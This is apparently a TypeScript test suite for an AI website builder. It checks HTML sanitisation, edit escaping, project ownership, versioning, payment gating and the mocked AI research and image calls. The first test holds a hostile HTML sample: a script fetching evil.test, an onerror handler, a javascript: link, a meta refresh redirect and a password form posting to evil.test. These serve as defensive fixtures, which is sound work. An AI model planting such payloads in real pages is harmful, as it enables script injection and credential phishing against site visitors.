import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createHash, randomUUID } from 'node:crypto';
import { createRequire } from 'node:module';
import { mkdtemp, rm } from 'node:fs/promises';
import path from 'node:path';
import { build } from 'esbuild';
import { load } from 'cheerio';
import sharp from 'sharp';
import { prepareBuilderHtml, modifyBuilderHtml, builderCsp, builderImageUrl } from '../api/_lib/express-builder-html.ts';
import { previewPrompt } from '../api/_lib/express-claude.ts';
import { BUILDER_DIRECTIONS } from '../src/lib/siteBuilder.ts';
import { CARTA_SECRETA_BUILDER, auditBuilderSite, feedbackForPrompt } from '../api/_lib/atlas-builder-skill.ts';

const origin='https://atlasdigital.ia.br';
const imageUrl=origin+'/api/site-express?view=builder&action=media&id='+randomUUID()+'&file='+randomUUID();
const business={name:'Empresa de teste',segment:'Arquitetura',city:'Porto Alegre, RS',services:'Projetos residenciais',whatsapp:'5551999999999',photo:'',assets:[]};
const raw=`<!doctype html><html><head><title>Empresa</title><style>:root{--atlas-accent:#778899}h1{color:var(--atlas-accent)}</style></head><body><nav><a href="#contato">Contato</a></nav><section id="inicio"><h1>Seu espaço</h1><p>Projeto feito para você.</p><img src="${imageUrl}" alt="Ambiente" data-atlas-parallax="true"></section><section id="servicos"><h2>Serviços</h2></section><section id="sobre"><h2>Sobre</h2></section><section id="contato"><h2>Vamos conversar</h2><a href="https://wa.me/5551999999999?text=Ol%C3%A1">WhatsApp</a></section></body></html>`;

test('generated documents cannot execute model code or leak private reference images',()=>{
 const malicious=raw.replace('</body>','<script>fetch("https://evil.test")</script><iframe src="https://evil.test"></iframe><img onerror="alert(1)" src="'+origin+'/api/site-express?view=builder&action=reference&id=x&file=y"><a href="javascript:alert(1)">Unsafe</a><meta http-equiv="refresh" content="0;url=https://evil.test"><form action="https://evil.test"><input name="password"></form></body>');
 const prepared=prepareBuilderHtml(malicious,origin);const $=load(prepared.html);
 assert.equal($('script').length,1);assert.equal($('iframe,form,input,[onerror]').length,0);assert.equal($('meta[http-equiv=refresh]').length,0);assert.equal($('a').last().attr('href'),'#contato');assert.equal($('img').last().attr('src')||'','');
 const hash=createHash('sha256').update($('script').text()).digest('base64');assert.ok(builderCsp(origin).includes('sha256-'+hash));assert.ok(builderCsp(origin).includes("connect-src 'none'"));assert.equal(prepared.sections.length,4);
 assert.equal(builderImageUrl('https://evil.test/a.jpg',origin),'');assert.equal(builderImageUrl(imageUrl,origin),imageUrl);
});
test('direct edits escape text, preserve IDs and keep only one runtime after repeated saves',()=>{
 let doc=prepareBuilderHtml(raw,origin);const id=doc.sections[0].texts[0].id;
 doc=modifyBuilderHtml(doc.html,{type:'text',id,text:'<script>roubar()</script> & Olá'},origin);assert.equal(doc.sections[0].texts[0].text,'<script>roubar()</script> & Olá');assert.equal(load(doc.html)('script').length,1);
 doc=modifyBuilderHtml(doc.html,{type:'visibility',id:'sobre',visible:false},origin);assert.equal(doc.sections.find(s=>s.id==='sobre')?.visible,false);
 doc=modifyBuilderHtml(doc.html,{type:'color',color:'#123456'},origin);let $=load(doc.html);assert.ok($('#atlas-brand').text().includes('#123456'));assert.equal($('style#atlas-runtime-style').length,1);assert.equal(doc.sections[0].texts[0].id,id);assert.throws(()=>modifyBuilderHtml(doc.html,{type:'text',id:'nope"] script',text:'x'},origin));
});
test('relative uploads and absolute generated media both become valid image URLs in the model prompt',()=>{
 const assets=[{id:'a',projectId:'a',kind:'photo' as const,name:'foto',mimeType:'image/webp' as const,width:100,height:100,size:100,url:imageUrl},{id:'b',projectId:'b',kind:'logo' as const,name:'logo',mimeType:'image/png' as const,width:100,height:100,size:100,url:'/api/site-express?view=asset&id=one&asset=two'}];
 const prompt=previewPrompt({...business,assets},{creativePrompt:'',brandColor:'#123456',origin});assert.ok(prompt.user.includes(imageUrl));assert.ok(!prompt.user.includes(origin+origin));assert.ok(prompt.user.includes(origin+'/api/site-express?view=asset'));
});

test('Carta Secreta constrói site final com critérios verificáveis e aprendizagem isolada por ramo',()=>{
 assert.match(CARTA_SECRETA_BUILDER,/CARTA 1/);assert.match(CARTA_SECRETA_BUILDER,/CARTA 4/);
 assert.match(CARTA_SECRETA_BUILDER,/SITE FINAL/);
 const audited=auditBuilderSite(prepareBuilderHtml(raw,origin).html);
 assert.equal(audited.checks.find(c=>c.id==='contato')?.ok,true);
 assert.equal(audited.checks.find(c=>c.id==='titulo')?.ok,false);
 const entries=[{segment:'Arquitetura',rating:'improve',note:'Exibir obras com fotos reais'}, {segment:'Restaurante',rating:'good',note:'Adicionar cardápio'}];
 assert.match(feedbackForPrompt(entries,'Arquitetura'),/Exibir obras/);
 assert.doesNotMatch(feedbackForPrompt(entries,'Arquitetura'),/cardápio/);
});

// Endpoint integration with in-memory transaction serialization and fake external services.
// No real customer data, API calls or payments are used by this suite.
class MemoryDb {
 data=new Map<string,any>();queue=Promise.resolve();collection=(p:string)=>new Query(this,p);
 async runTransaction(fn:any){const prev=this.queue;let release:()=>void;this.queue=new Promise<void>(resolve=>release=resolve);await prev;try{return await fn({get:(r:any)=>r.get(),getAll:(...refs:any[])=>Promise.all(refs.map(r=>r.get())),create:(r:any,d:any)=>r.create(d),set:(r:any,d:any)=>r.set(d),update:(r:any,d:any)=>r.update(d)});}finally{release!();}}
 batch(){const ops:(()=>any)[]=[];return {create:(r:any,d:any)=>ops.push(()=>r.create(d)),set:(r:any,d:any)=>ops.push(()=>r.set(d)),update:(r:any,d:any)=>ops.push(()=>r.update(d)),commit:async()=>{for(const op of ops)await op();}};}
}
class Ref {
 constructor(public db:MemoryDb,public path:string){}get id(){return this.path.split('/').pop()!;}collection(n:string){return new Query(this.db,this.path+'/'+n);}async get(){const d=this.db.data.get(this.path);return {id:this.id,exists:!!d,data:()=>d};}async create(d:any){if(this.db.data.has(this.path))throw new Error('Already exists');this.db.data.set(this.path,d);}async set(d:any){this.db.data.set(this.path,d);}async update(d:any){const next={...this.db.data.get(this.path)};for(const [key,value]of Object.entries(d)){const parts=key.split('.');let target=next;for(const k of parts.slice(0,-1))target=target[k]={...target[k]};target[parts.at(-1)!]=value;}this.db.data.set(this.path,next);}
}
class Query {
 filters:any[]=[];sort?:string;max=Infinity;constructor(public db:MemoryDb,public path:string){}doc(id:string){return new Ref(this.db,this.path+'/'+id);}where(k:string,_op:string,v:any){this.filters.push([k,v]);return this;}orderBy(k:string,_dir?:string){this.sort=k;return this;}limit(n:number){this.max=n;return this;}async get(){let docs=[...this.db.data.entries()].filter(([k,d])=>k.startsWith(this.path+'/')&&k.slice(this.path.length+1).split('/').length===1&&this.filters.every(([f,v])=>d[f]===v)).map(([k,d])=>({id:k.split('/').pop()!,data:()=>d}));if(this.sort)docs.sort((a,b)=>b.data()[this.sort!]-a.data()[this.sort!]);return{docs:docs.slice(0,this.max)};}
}
async function loadEndpoint(){
 const temp=await mkdtemp(path.join(process.cwd(),'.builder-test-'));const out=path.join(temp,'endpoint.cjs');
 await build({entryPoints:['api/_lib/express-builder.ts'],outfile:out,bundle:true,platform:'node',format:'cjs',packages:'external',logLevel:'silent',plugins:[{name:'fixtures',setup(b){
 b.onResolve({filter:/express-store\.js$|\/radar\.js$|express-assets\.js$|express-claude\.js$|express-builder-ai\.js$/},args=>({path:args.path,namespace:'fixture'}));
 b.onLoad({filter:/.*/,namespace:'fixture'},args=>{let names=args.path.includes('express-store')?['db','previews','settings','orders','orderId','publicOrigin','saoPauloDay','rateLimit']:args.path.includes('radar')?['getAuthenticatedEmail']:args.path.includes('express-assets')?['resolveExpressAssets','rasterInfo','ASSET_MAX_BYTES','ExpressAssetError']:args.path.includes('express-claude')?['claudeConfigured','claudeText','extractSiteHtml']:['researchBuilder','builderPrompt','generateBuilderPhoto'];return {contents:names.map(n=>`export const ${n}=globalThis.__atlasBuilderTest.${n};`).join('\n'),loader:'js'};});
 }}]});
 const require=createRequire(import.meta.url);return {handler:require(out).default,close:()=>rm(temp,{recursive:true,force:true})};
}
test('authenticated endpoint: ownership, reference cap, model input, job retries, versions and payment gate',async t=>{
 const db=new MemoryDb();let generationCalls=0;let modelReferences:any[]=[];const fixture:any={db:()=>db,previews:()=>db.collection('expressPreviews'),settings:()=>db.collection('expressInternal').doc('settings'),orders:()=>db.collection('expressOrders'),orderId:(v:any)=>typeof v==='string'&&/^[a-f0-9-]{36}$/i.test(v),publicOrigin:()=>origin,saoPauloDay:()=> '2026-11-18',rateLimit:async()=>true,getAuthenticatedEmail:async(req:any,verified=false)=>verified&&req.headers.verified!=='yes'?null:req.headers.authorization||null,resolveExpressAssets:async()=>[],rasterInfo:(data:Buffer)=>{assert.equal(data.subarray(1,4).toString(),'PNG');return{mimeType:'image/png',width:1,height:1};},ASSET_MAX_BYTES:750*1024,ExpressAssetError:class extends Error{},claudeConfigured:()=>true,claudeText:async()=>{generationCalls++;return raw;},extractSiteHtml:(s:string)=>s,researchBuilder:async()=>({sources:[],directions:BUILDER_DIRECTIONS,researchNotice:'Sem fontes públicas acessíveis.'}),builderPrompt:async(_b:any,_d:any,_c:any,_o:any,refs:any[])=>{modelReferences=refs;return{system:'',content:[]};},generateBuilderPhoto:async()=>{throw new Error('Fake generator unavailable');}};
 (globalThis as any).__atlasBuilderTest=fixture;const endpoint=await loadEndpoint();
 const call=async(action:string,body:any={},user:string|null='cliente@example.com',method='POST')=>{const r:any={statusCode:200,headers:{},setHeader(k:string,v:any){this.headers[k]=v;},status(n:number){this.statusCode=n;return this;},json(d:any){this.body=d;return this;},send(d:any){this.body=d;return this;},end(){return this;}};await endpoint.handler({method,query:{action,...(method==='GET'?body:{})},body,headers:{...(user?{authorization:user}:{})}},r);return r;};
 try{
 const id=randomUUID();assert.equal((await call('create',{id,business},null)).statusCode,401);const created=await call('create',{id,business});assert.equal(created.statusCode,200);assert.equal(created.body.project.version,0);assert.equal((await call('state',{id},'outro@example.com','GET')).statusCode,404);
 const png=Buffer.concat([Buffer.from([137,80,78,71]),Buffer.alloc(64)]).toString('base64');const upload=()=>call('upload-reference',{id,fileId:randomUUID(),name:'Referência de estilo',data:png});const results=await Promise.all([upload(),upload(),upload(),upload(),upload()]);assert.equal(results.filter(r=>r.statusCode===200).length,4);assert.equal(results.filter(r=>r.statusCode===400).length,1);
 const state=await call('state',{id},undefined,'GET');assert.equal(state.body.project.references.length,4);assert.ok(!JSON.stringify(state.body).includes('ownerEmail'));assert.ok(!JSON.stringify(state.body).includes(png));const file=state.body.project.references[0].id;
 assert.equal((await call('reference',{id,file},null,'GET')).statusCode,401);assert.equal((await call('reference',{id,file},'outro@example.com','GET')).statusCode,404);assert.equal((await call('reference',{id,file},undefined,'GET')).statusCode,200);
 // Existing business photo skips automatic image phase; fake media is not published externally.
 const p=db.data.get('expressBuilderProjects/'+id);p.business.assets=[{kind:'photo',id:randomUUID()}];const requestId=randomUUID();assert.equal((await call('start',{id,requestId,type:'generate',text:'Use estas referências.'})).statusCode,200);assert.equal((await upload()).statusCode,409);const runs=await Promise.all([call('run',{id}),call('run',{id})]);assert.equal(generationCalls,1);assert.equal(modelReferences.length,4);assert.equal((await call('state',{id},undefined,'GET')).body.project.version,1);assert.equal((await call('start',{id,requestId,type:'generate'})).body.project.job,null);assert.equal(generationCalls,1);
 const checked=await call('feedback',{id,version:1,rating:'improve',note:'Dar mais destaque ao hero'});assert.equal(checked.statusCode,200);assert.equal(checked.body.project.feedback.rating,'improve');assert.equal((await call('feedback',{id,version:1,rating:'good'},'outro@example.com')).statusCode,404);
 const textId=runs.find(r=>r.body.project.html)?.body.project.sections[0].texts[0].id;
 assert.equal((await call('modify',{id,version:0,operation:{type:'text',id:textId,text:'Wrong'}})).statusCode,409);assert.equal((await call('modify',{id,version:1,operation:{type:'text',id:textId,text:'Novo título'}})).body.project.version,2);assert.equal((await call('restore',{id,version:1})).body.project.version,3);
 assert.equal((await call('publish',{id})).statusCode,402);await db.collection('expressOrders').doc(randomUUID()).set({previewId:randomUUID(),status:'paid',mode:'live'});assert.equal((await call('publish',{id})).statusCode,402);await db.collection('expressOrders').doc(randomUUID()).set({previewId:id,status:'paid',mode:'test'});assert.equal((await call('publish',{id})).statusCode,402);await db.collection('expressOrders').doc(randomUUID()).set({previewId:randomUUID(),status:'paid',mode:'live'});assert.equal((await call('publish',{id})).statusCode,402);await db.collection('expressOrders').doc(randomUUID()).set({previewId:id,status:'paid',mode:'live'});const pub=await call('publish',{id});assert.equal(pub.statusCode,200);assert.ok(pub.body.project.publishedUrl.startsWith(origin+'/s/'));const slug=pub.body.project.publishedUrl.split('/').pop();const publicPage=await call('published',{slug},null,'GET');assert.equal(publicPage.statusCode,200);assert.ok(publicPage.headers['Content-Security-Policy'].includes("frame-ancestors 'none'"));assert.ok(!publicPage.body.includes(png));
 }finally{await endpoint.close();delete (globalThis as any).__atlasBuilderTest;}
});

test('Pinterest research only displays real search URLs; four uploaded images are actually supplied to vision; Gemini decodes image response',async()=>{
 const temp=await mkdtemp(path.join(process.cwd(),'.builder-test-'));const out=path.join(temp,'ai.cjs');
 await build({entryPoints:['api/_lib/express-builder-ai.ts'],outfile:out,bundle:true,platform:'node',format:'cjs',packages:'external',logLevel:'silent',plugins:[{name:'assets-fixture',setup(b){b.onResolve({filter:/express-assets\.js$/},args=>({path:args.path,namespace:'assets-fixture'}));b.onLoad({filter:/.*/,namespace:'assets-fixture'},()=>({contents:'export const visualAssetInputs=async()=>[];',loader:'js'}));}}]});
 const ai=createRequire(import.meta.url)(out);const originalFetch=globalThis.fetch;const oldClaude=process.env.ANTHROPIC_API_KEY;const oldGemini=process.env.GEMINI_API_KEY;process.env.ANTHROPIC_API_KEY='test';process.env.GEMINI_API_KEY='test';
 try{
 let request:any;globalThis.fetch=async(_url:any,options:any)=>{request=JSON.parse(options.body);return new Response(JSON.stringify({content:[{type:'web_search_tool_result',content:[{type:'web_search_result',url:'https://br.pinterest.com/pin/123/',title:'Referência real'},{url:'https://evil.test/pin',title:'Excluir'}]},{type:'text',text:JSON.stringify({directions:[{name:'Estilo pesquisado',accent:'#123456'}],url:'https://pinterest.com/pin/inventado'})}]}),{status:200});};
 const research=await ai.researchBuilder(business);assert.equal(research.sources.length,1);assert.equal(research.sources[0].url,'https://br.pinterest.com/pin/123/');assert.equal(research.directions[0].name,'Estilo pesquisado');assert.deepEqual(request.tools[0].allowed_domains,['pinterest.com']);
 globalThis.fetch=async()=>new Response(JSON.stringify({content:[{type:'web_search_tool_result',content:{type:'web_search_tool_result_error',error_code:'unavailable'}},{type:'text',text:'{"url":"https://pinterest.com/fabricado"}'}]}));assert.equal((await ai.researchBuilder(business)).sources.length,0);
 const refs=Array.from({length:5},(_,n)=>({name:'Ref '+n,mimeType:'image/png',data:'base64-'+n}));const prompt=await ai.builderPrompt(business,BUILDER_DIRECTIONS[0],'',origin,refs,'Crie meu site.');assert.equal(prompt.content.filter((c:any)=>c.type==='image').length,4);assert.deepEqual(prompt.content.filter((c:any)=>c.type==='image').map((c:any)=>c.source.data),refs.slice(0,4).map(r=>r.data));
 const png=await sharp({create:{width:80,height:60,channels:3,background:'#667788'}}).png().toBuffer();globalThis.fetch=async()=>new Response(JSON.stringify({output_image:{data:png.toString('base64')}}));const photo=await ai.generateBuilderPhoto(business,'Ambiente','16:9');assert.equal(photo.mimeType,'image/webp');assert.equal(photo.width,80);assert.ok(photo.buffer.length>40);
 }finally{globalThis.fetch=originalFetch;if(oldClaude===undefined)delete process.env.ANTHROPIC_API_KEY;else process.env.ANTHROPIC_API_KEY=oldClaude;if(oldGemini===undefined)delete process.env.GEMINI_API_KEY;else process.env.GEMINI_API_KEY=oldGemini;await rm(temp,{recursive:true,force:true});}
});
